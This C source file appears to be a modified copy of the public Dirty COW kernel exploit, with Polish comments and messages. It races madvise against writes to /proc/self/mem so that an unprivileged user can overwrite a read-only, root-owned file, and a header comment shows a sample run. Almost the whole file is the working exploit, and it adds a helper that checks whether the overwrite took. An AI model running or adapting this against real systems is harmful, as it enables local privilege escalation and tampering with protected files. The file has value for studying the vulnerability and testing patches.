/*
####################### brudna krowa - based on dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

void* map;
int f;
struct stat st;

char* readFile(char* filename) {
    char* content = NULL;

    int fd = open(filename, O_RDONLY);

    if (fd == -1) {
        printf("error opening new_content_file\n");
        return NULL;
    }

    struct stat stFile;
    fstat(fd, &stFile);

    int filesize = stFile.st_size;

    content = (char*) malloc(sizeof(char) * (filesize + 1));
    content[filesize] = 0;

    int bytes_read = read(fd, content, filesize);

    if (bytes_read != filesize) {
        printf("error reading new_content_file, bytes_read: %d, filesize: %d\n", bytes_read,
               filesize);
        return NULL;
    }
    close(fd);

    return content;
}

char* readFileContentAndSize(char* filename, int* size) {
    char* content = NULL;

    int fd = open(filename, O_RDONLY);

    if (fd == -1) {
        printf("error opening new_content_file\n");
        return NULL;
    }

    struct stat stFile;
    fstat(fd, &stFile);

    int filesize = stFile.st_size;
    *size = filesize;

    content = (char*) malloc(sizeof(char) * (filesize + 1));
    content[filesize] = 0;

    int bytes_read = read(fd, content, filesize);

    if (bytes_read != filesize) {
        printf("error reading file, bytes_read: %d, filesize: %d\n", bytes_read, filesize);
        return NULL;
    }
    close(fd);

    return content;
}

//TODO trzeci wątek sprawdzający czy się nadpisało

int filesEqual(char* file1, char* file2) {
    int filesize1;
    char* content1 = readFileContentAndSize(file1, &filesize1);
    if (content1 == NULL) {
        return -1; //ERROR
    }

    int filesize2;
    char* content2 = readFileContentAndSize(file2, &filesize2);
    if (content2 == NULL) {
        return -1; //ERROR
    }

    if (filesize1 != filesize2) {
        return 0;
    }

    for (int i = 0; i < filesize1; i++) {
        char c1 = content1[i];
        char c2 = content2[i];
        if (c1 != c2) {
            return 0;
        }
    }

    return 1;
}

void* madviseThread(void* arg) {
    int i, c = 0;
    for (i = 0; i < 100000000; i++) {

/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("dupa - madviseThread thread finished - madvise %d\n\n", c);
}

void* procselfmemThread(void* arg) {
    char* str;
    str = (char*) arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for (i = 0; i < 100000000; i++) {
/*
You have to reset the file pointer to the memory position.
*/
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("dupa - procselfmemThread thread finished - procselfmem %d\n\n", c);
}


int main(int argc, char* argv[]) {
/*
You have to pass two arguments. File and Contents.
*/
    if (argc < 3) {
        printf("usage:\n");
        printf("dirtycowy target_file new_content_file\n");
        printf("dirtycowy --cmp file1 file2\n");
        return 1;
    }

    //opcja porównania plików
    if (argc == 4) {
        if (strcmp(argv[1], "--cmp") == 0) {
            printf("Comparing files...\n");

            int result = filesEqual(argv[2], argv[3]);

            if (result == -1) {
                printf("Comparing error.\n");
            } else if (result == 0) {
                printf("Files are different :(\n");
            } else if (result == 1) {
                printf("Files are equal :)\n");
            }

            return 0;
        }
    }

    pthread_t pth1, pth2;
/*
You have to open the file in read only mode.
*/
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    printf("mmap %zx\n\n", (uintptr_t) map);

    // wczytanie pliku z nowa zawartoscia
    char* newContent = readFile(argv[2]);
    if (newContent == NULL) {
        return 1;
    }
    printf("New content:\n%s\n\n", newContent);

    printf("Uwaga, napierdalam dirtycowy...\n");
/*
You have to do it on two threads.
*/
    pthread_create(&pth1, NULL, madviseThread, argv[1]);
    pthread_create(&pth2, NULL, procselfmemThread, newContent);
/*
You have to wait for the threads to finish.
*/
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    printf("done\n");
    return 0;
}
